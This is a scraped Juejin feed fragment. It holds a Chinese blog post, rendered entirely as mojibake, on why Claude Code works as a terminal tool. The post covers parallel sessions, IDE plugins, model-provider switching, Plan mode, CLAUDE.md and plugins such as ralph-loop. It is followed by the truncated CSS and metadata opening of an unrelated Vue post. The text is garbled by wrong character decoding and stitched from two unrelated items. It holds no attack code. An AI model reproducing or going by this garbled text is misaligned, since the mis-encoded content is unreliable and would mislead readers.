.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ€è¿‘è¶Šæ¥è¶Šå¤šçš„äººå¼€å§‹åœ¨ç»ˆç«¯ï¼Œå¦‚ Claude Codeã€Qwen Codeã€Gemini CLIã€iFlow CLI ç­‰ä¸­å†™ä»£ç äº†ã€‚</p>
<p>è¯´å®è¯ï¼Œæˆ‘ä¹‹å‰ä¹Ÿæœ‰äº›ä¸è§£ï¼Œæ„Ÿè§‰å®Œå…¨æ²¡å¿…è¦ï¼Œåœ¨ç»ˆç«¯é‡Œå†™ä»£ç ä¸æ˜¯å¾ˆæ–¹ä¾¿ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0a963952e49846cbafa3c7401ff63fa8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444529&amp;x-signature=DB8CC6TD%2FGBJSunQgDL%2FxdPF%2BbA%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æœ€è¿‘å¼€å§‹ä½“éªŒ Claude Code ä¹‹åï¼Œæ„Ÿè§‰æ‰“å¼€äº†ä¸€ä¸ªæ–°ä¸–ç•Œã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/76e084e87fdb43dbbc78bdb00eb3f09f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444529&amp;x-signature=LsqZhfJQQvigbrtRRJRz20dd6yY%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æ›´è®©æˆ‘éå¸¸æ„å¤–çš„æ˜¯ï¼Œå½“å¾ˆå¤šäººè¿˜åœ¨æŠ±æ€¨ CLI å¯¹æ™®é€šäººä¸å‹å¥½çš„æ—¶å€™ï¼Œæˆ‘çœ‹åˆ°å¤§å‚æœ‰ä¸ªåˆ« AI äº§å“ç»ç†å’Œ AI è¿è¥å²—ä½çš„åŒå­¦ä¹Ÿå¼€å§‹å­¦ä¹ å’Œä½¿ç”¨ Claude Code äº†ã€‚ä½†ä»–ä»¬æ›´å¤šçš„è¿˜æ˜¯å®Œæˆæ–¹æ¡ˆè®¾è®¡ã€æ–‡æ¡£å¤„ç†ç­‰ï¼Œè€Œä¸æ˜¯å†™ä»£ç ã€‚</p>
<p>å¯èƒ½å¾ˆå¤šäººæ²¡ç”¨ã€æ²¡æ·±å…¥ä½“éªŒä¹‹å‰ä¹Ÿæœ‰ç±»ä¼¼å›°æƒ‘ã€‚</p>
<p>è¿™ç¯‡æ–‡ç« è°ˆè°ˆè‡ªå·±çš„ç†è§£ã€‚</p>
<hr/>
<h2 data-id="heading-0">ä¸ºä»€ä¹ˆ Claude Code é‡‡ç”¨ CLI è€Œä¸æ˜¯ IDE çš„å½¢å¼ï¼Ÿ</h2>
<p>Claude Codeï¼ˆç®€ç§° CCï¼‰ åˆ›å§‹äºº Boris Cherny Â åœ¨ã€ŠMastering Claude Code in 30 minutesã€‹ æ¼”è®²ä¸­æåˆ°ä¸¤ä¸ªåŸå› ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eda25f9420474bc5b7528ae05fb98829~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444529&amp;x-signature=STfsC07GV41wyErKgzCMoF2wmxQ%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>Anthropic çš„å‘˜å·¥ä½¿ç”¨çš„ IDE äº”èŠ±å…«é—¨ï¼Œæœ‰ VS Code ï¼Œè¿˜æœ‰ Zedã€Xcodeã€Vim ç­‰ã€‚æƒ³è¦å¼€å‘å‡ºé€‚åˆæ‰€æœ‰äº§å“çš„å·¥å…·ï¼Œå¾ˆéš¾ã€‚ç»ˆç«¯æ˜¯å”¯ä¸€çš„ä¸€ä¸ªé€šç”¨å·¥å…·ã€‚</p>
<p>å…¶æ¬¡ä»–è®¤ä¸ºæŠ€æœ¯å‘å±•å¤ªå¿«ï¼Œå¾ˆæœ‰å¯èƒ½å¤§å®¶å¾ˆå¿«å°±ä¸å†ä½¿ç”¨ IDE äº†ï¼Œé¿å…ä»–ä»¬åœ¨ UI å’Œä¸€äº›åº•å±‚èƒ½åŠ›ä¸ŠæŠ•å…¥è¿‡å¤šçš„èµ„æºã€‚</p>
<h2 data-id="heading-1">CC å†™ä»£ç çš„å¥½å¤„æœ‰å“ªäº›ï¼Ÿ</h2>
<p>è¿™é‡Œæˆ‘åˆ†äº«å‡ ä¸ªä½¿ç”¨ Claude Code è¿™ç±»å‘½ä»¤è¡Œç¼–ç å·¥å…·çš„å‡ å¤§ç†ç”±ã€‚</p>
<hr/>
<h3 data-id="heading-2">å¹¶è¡Œå¼€å‘</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ac17393c59d64a1eb5b03e7224f394ed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444529&amp;x-signature=2yAaS8auaiZiRuR%2Bwvqk4y1xhv4%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>Claude Code ç”±äºåœ¨ç»ˆç«¯ä¸­è¿è¡Œï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿åœ°å¼€å¤šä¸ªç»ˆç«¯ï¼Œä½ å¯ä»¥æŠŠä»»åŠ¡æ‹†å¾—ç›¸å¯¹ç›¸äº’ä¸å¹²æ‰°ï¼Œç„¶åå¯ä»¥è®©å®ƒå¹¶è¡Œæ‰§è¡Œå¾ˆå¤šä»»åŠ¡ï¼Œæ•ˆç‡éå¸¸é«˜ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/96771743305e4fb78ad1a40058e10cfd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444529&amp;x-signature=I6beZ6nXZg%2FPGpsB6aVPdU4q6XY%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>Claude Code åˆ›å§‹äºº Boris Cherny è¿‘æ—¥åœ¨ Xï¼ˆåŸæ¨ç‰¹ï¼‰åˆ†äº«è‡ªå·±ä½¿ç”¨ Claude Code çš„ä¸€ä¸ªç»éªŒå°±æ˜¯åŒæ—¶å¼€ 5 ä¸ª TABï¼Œé«˜æ•ˆç¼–ç ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/296dc50690aa4b65be74534cc776661f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444529&amp;x-signature=%2BKC2XfXy1Opu8a%2BO63se8XCPq%2FA%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>ç½‘ä¸Šä¹Ÿæœ‰å¾ˆå¤šç›¸å…³çš„è®¨è®ºã€‚æ¯”å¦‚è¯´å¦‚æœç›´æ¥ä½¿ç”¨ IDE çš„è¯ï¼Œé‚£ä¹ˆå¯èƒ½åšå¥½è®¡åˆ’ä¹‹åæ‰§è¡Œä¼šé˜»å¡ IDEã€‚é‚£ä¹ˆä½¿ç”¨ Claude Code å°±æ²¡æœ‰è¿™ç§é—®é¢˜ã€‚</p>
<h3 data-id="heading-3">è·¨ç«¯ååŒ</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ba4edea7e0de48e987a80c17c8ba1686~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444529&amp;x-signature=IedqUU4WzWJ04VvtXQvvVuMAddA%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æœ‰ Claude Code æœ‰ç½‘é¡µç«¯ï¼Œä¹Ÿæœ‰å®¢æˆ·ç«¯ï¼Œè¿˜æœ‰ Chrome æ’ä»¶ï¼Œè¿˜æœ‰ VS Code çš„å’Œ JetBrains çš„æ’ä»¶ç­‰ç­‰ï¼Œå¯ä»¥éå¸¸æ–¹ä¾¿åœ°è·¨å¤šç«¯ååŒã€‚</p>
<p>ä¹‹å‰æˆ‘æ‹…å¿ƒåœ¨ç»ˆç«¯ä¸­å†™ä»£ç ä¸æ˜¯å¾ˆæ–¹ä¾¿ã€‚å…¶å®ä½¿ç”¨ç»ˆç«¯ä¸ä»£è¡¨ä¸€å®šä¸èƒ½ç”¨ IDEã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/460ffab7bdba48a195613f46e6d88e1c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444529&amp;x-signature=Y1HgrqT7r93DtS8xw6tbR4C50HY%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨ IDEA é‡Œé¢å®‰è£… Claude Code æ’ä»¶ï¼Œä¹Ÿå¯ä»¥è¾¹å¯¹è¯ï¼Œè¾¹æŸ¥çœ‹ä¿®æ”¹çš„ä¿¡æ¯ï¼Œå®ƒè¿˜èƒ½å¤Ÿè‡ªåŠ¨è·å–å½“å‰æ­£åœ¨æ‰“å¼€çš„æ–‡ä»¶çš„ä¿¡æ¯ï¼Œç­‰ç­‰ï¼Œä¹Ÿéå¸¸æ–¹ä¾¿ã€‚</p>
<h3 data-id="heading-4">æ›´è½»é‡</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ccd840c620ac4795a0a370493102d071~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444529&amp;x-signature=Pvz2k0MLFjCpXAb3IaUDHxjNSUg%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å¾ˆå¤šç”µè„‘è£… IDEï¼Œå°¤å…¶åŒæ—¶æ‰“å¼€å¤šä¸ªé¡¹ç›®ï¼Œå ç”¨å†…å­˜ç‰¹åˆ«å¤§ï¼Œç”šè‡³ä¼šé€ æˆä¸€äº›å¡é¡¿ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dbf4207d70524d34b03fc78bb7ac94a8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444529&amp;x-signature=BdfiAobMY5U7Q539NUVoJytMGug%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>é‚£ä¹ˆä½¿ç”¨ç»ˆç«¯çš„è¯å°±éå¸¸è½»é‡ã€‚</p>
<h3 data-id="heading-5">æ¨¡å‹åŸç”Ÿé€‚é…</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/91914ac327864cb4900bdb1cada55bd1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444529&amp;x-signature=%2FGj4AbWg%2BFegWOp446B0LLMnzcM%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>Anthropic å®˜æ–¹å‡ºçš„å·¥å…·ï¼Œèƒ½å¤Ÿç¬¬ä¸€æ—¶é—´åˆ©ç”¨æ¨¡å‹çš„æœ€å…ˆè¿›ç‰¹æ€§ï¼Œå¦‚ MCPã€Skills ç­‰ï¼Œåœ¨æŒ‡ä»¤éµå¾ªå’Œä»£ç è´¨é‡ä¸Šå¾€å¾€å…·æœ‰â€œäº²å„¿å­â€åŠ æˆã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/11a09807256c45c68c78e5560df13c3b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444529&amp;x-signature=SOsVNsPjwz0xfoJh8UbXf%2BIWh%2B4%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æ¯”å¦‚ Claude Code å…ˆæ”¯æŒ Skillsï¼ŒCursor è¿‡ä¸€æ®µæ—¶é—´æ‰æ”¯æŒã€‚</p>
<p>å‚è§ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fcursor.com%2Fdocs%2Fcontext%2Fskills" target="_blank" title="https://cursor.com/docs/context/skills" ref="nofollow noopener noreferrer">cursor.com/docs/contexâ€¦</a></p>
<h3 data-id="heading-6">æ›´è‡ªç”±çš„æœåŠ¡å•†åˆ‡æ¢</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ed3451db359243e0b0dbefb711fe08cf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444529&amp;x-signature=8%2FP%2FZYJWWdtqxncHsOlNpSQXKn8%3D" alt="å›¾ç‰‡" loading="lazy"/>æœ‰äº› AI Coding IDE Â å†…ç½®äº†å¾ˆå¤šæ¨¡å‹ï¼Œä½†ä¸æ”¯æŒä½ åˆ‡æ¢ä¸€äº›æ¨¡å‹æœåŠ¡å•†ï¼Œç”šè‡³ä½ æ— æ³•æ˜ç¡®çŸ¥é“ä½¿ç”¨çš„æ˜¯å“ªä¸ªæ¨¡å‹ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3267702bb55742dcb53aece2058045e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444529&amp;x-signature=QqUdIPEGqe%2BhsdDVDdS%2FsPGnvKw%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>Claude Code çš„è¯ï¼Œé€šè¿‡ä¿®æ”¹ç¯å¢ƒå˜é‡å¯ä»¥éå¸¸è½»æ¾åœ°åˆ‡æ¢è‡ªå·±æƒ³è¦ä½¿ç”¨çš„æ¨¡å‹æœåŠ¡å•†ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8aea5b00b43f41ab81b260e72b268ddf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444529&amp;x-signature=UsqzVWoer3Gw5zJOOMSJfv%2Bd%2BoE%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æƒ³è¦æ›´æ–¹ä¾¿åœ°åˆ‡æ¢æ¨¡å‹ï¼Œå¯ä»¥è£… cc-switch è¿™ä¸ªå·¥å…·ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ffarion1231%2Fcc-switch%3Ftab%3Dreadme-ov-file" target="_blank" title="https://github.com/farion1231/cc-switch?tab=readme-ov-file" ref="nofollow noopener noreferrer">github.com/farion1231/â€¦</a></p>
<h3 data-id="heading-7">åŠŸèƒ½å¼ºå¤§</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d282aa31786f40bd91b7086664c27d85~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444529&amp;x-signature=ussThxN%2Bbjd05GCHdtfrMQzo180%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æ¯”å¦‚è¯´åŸç”Ÿå°±æ”¯æŒ Plan æ¨¡å¼ï¼ŒClaude åªè¿›è¡Œåªè¯»åˆ†æå’Œè§„åˆ’ï¼Œä¸æ‰§è¡Œä»»ä½•ä¿®æ”¹ã€‚è¿™éå¸¸é€‚åˆåœ¨ä¸ç ´åä»£ç åº“çš„æƒ…å†µä¸‹ï¼Œè®© AI å…ˆæ·±å…¥ç†è§£å¤æ‚çš„ä»£ç ç»“æ„æˆ–è§„åˆ’é‡æ„æ–¹æ¡ˆï¼Œç¡®è®¤å¥½ä¹‹åå†è¿›è¡Œæµæ°´çº¿ç¼–å†™ä»£ç ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a7bc709d09b44f76968292bc679f9f31~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444529&amp;x-signature=qIrjhdqDcZG%2FOIn54txby5uuYOg%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>Claude Code é€šè¿‡åœ¨é¡¹ç›®æ ¹ç›®å½•æ”¾ç½® Â <code>CLAUDE.md</code>Â æ–‡ä»¶ï¼ŒåŒ…æ‹¬ä»£ç é£æ ¼ã€å¸¸ç”¨å‘½ä»¤ã€æ¶æ„å†³ç­–ç­‰ï¼Œè®© AI èƒ½å¤Ÿâ€œè®°ä½â€é¡¹ç›®çš„ç‰¹å®šçŸ¥è¯†ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/059642b1a7f6494ab87fa9990bfc5b89~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444529&amp;x-signature=lF4xzLBJq%2FlHxImkrHOJh%2F5wacM%3D" alt="å›¾ç‰‡" loading="lazy"/>CC æœ‰æµ·é‡å¤šå¥½ç”¨çš„æ’ä»¶å’Œ Skillsã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6312b8d8090048fb8a8c724572725de6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444529&amp;x-signature=xjAHwgA6zMSHh3Svz7ORSbuJLvw%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æ¯”å¦‚ CC çš„å®˜æ–¹æ’ä»¶ ralph-loop ï¼Œå¯ä»¥åå¤è‡ªåŠ¨å‘ AI Agent è¾“å…¥æç¤ºè¯ï¼Œè®©å®ƒè¿›è¡Œå¤šè½®è¿­ä»£ï¼Œä½¿ç»“æœæ›´å¥½ã€‚</p>
<p>Github åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fanthropics%2Fclaude-plugins-official%2Ftree%2Fmain%2Fplugins%2Fralph-loop" target="_blank" title="https://github.com/anthropics/claude-plugins-official/tree/main/plugins/ralph-loop" ref="nofollow noopener noreferrer">github.com/anthropics/â€¦</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c778c41402b840248b8376f63afde3e3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444529&amp;x-signature=i8xk9vaYe0%2BoK8R8yoK5Aiv0Zo0%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æ¯”å¦‚ CC çš„ planning-with-files Skillsï¼Œå‚è€ƒ Manus æ¨¡å¼ï¼Œå°†ä½ çš„å·¥ä½œæµç¨‹è½¬åŒ–ä¸ºä½¿ç”¨æŒä¹…åŒ–çš„markdownæ–‡ä»¶è¿›è¡Œè§„åˆ’ã€è¿›åº¦è·Ÿè¸ªå’ŒçŸ¥è¯†å­˜å‚¨ã€‚</p>
<p>Github åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FOthmanAdi%2Fplanning-with-files" target="_blank" title="https://github.com/OthmanAdi/planning-with-files" ref="nofollow noopener noreferrer">github.com/OthmanAdi/pâ€¦</a></p>
<p>æ‹“å±•é˜…è¯»ï¼š</p>
<ul>
<li>åˆ›å§‹äººè‡ªè¿°ï¼šæˆ‘å¦‚ä½•ç”¨ Claude Code ä¸€ä¸ªäººå¹²ç¿»ä¸€ä¸ªç»„ï¼Ÿ13æ¡ç¡¬æ ¸æŠ€å·§é¦–æ¬¡å…¬å¼€</li>
<li>ç»ˆäºæœ‰äººæŠŠ Claude Skills çš„æ¦‚å¿µç»™æˆ‘è®²æ˜ç™½äº†ï¼</li>
<li>æé€Ÿåˆ›å»ºä¸€ä¸ªé«˜è´¨é‡çš„ Claude Skills æœ€ä½³å®è·µ</li>
<li>å¦‚ä½•åœ¨ Qoderã€Cursorã€Traeã€Windsurf ç­‰ AI Coding å·¥å…·ä¸­ä½¿ç”¨ Claude Skills</li>
</ul>
<h2 data-id="heading-8">å†™åœ¨æœ€å</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/de5d593f6c2b42f69a29ab34d185a0c2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444529&amp;x-signature=tSpGlnt8EFVJtl8ee%2F%2BVoIT45Tw%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>Claude Code è®©æˆ‘æ„è¯†åˆ°æˆ‘ä»¬ç¨‹åºå‘˜éœ€è¦çªç ´è‡ªå·±çš„èˆ’é€‚åŒºï¼Œç§¯ææ¥å—ä¸€äº›æ–°é²œçš„æŠ€æœ¯å’Œå·¥å…·ã€‚</p>
<p>Claude Code ä¹Ÿè¿˜è®©æˆ‘æ„è¯†åˆ°å¾ˆå¤šä¸œè¥¿å¹¶ä¸æ˜¯ä¸€ä¸ªäºŒé€‰ä¸€çš„é€‰æ‹©ï¼Œå¯ä»¥æŠŠå¤šä¸ªå·¥å…·çš„ä¼˜åŠ¿ç»“åˆåœ¨ä¸€èµ·ã€‚</p>
<hr/>
<p>æ¬¢è¿å…³æ³¨æˆ‘çš„å…¬ä¼—å·ï¼š<strong>æ‚Ÿé¸£AI</strong>ï¼Œåç»­ä¼šé™†ç»­åˆ†äº«æ¯”è¾ƒæœ‰ç”¨çš„ AI å·¥å…·å’Œæ¯”è¾ƒå¥½çš„ AI ç»éªŒï¼Œæ¯”è¾ƒå®¢è§‚ç†æ€§çš„ AI è§‚ç‚¹ç­‰ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f16e2427a55c4d2887f9ce774027cc8b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444529&amp;x-signature=GoR1LuxlgLBp%2Fc43jnkEGilsJww%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[VueæŒ‡ä»¤]]></title>    <link>https://juejin.cn/post/7592548677743968302</link>    <guid>https://juejin.cn/post/7592548677743968302</guid>    <pubDate>2026-01-08T02:37:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592548677743968302" data-draft-id="7592582130594021427" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="VueæŒ‡ä»¤"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-08T02:37:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="GUIRH"/> <meta itemprop="url" content="https://juejin.cn/user/1258279294208109"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            VueæŒ‡ä»¤
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1258279294208109/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    GUIRH
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T02:37:51.000Z" title="Thu Jan 08 2026 02:37:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid 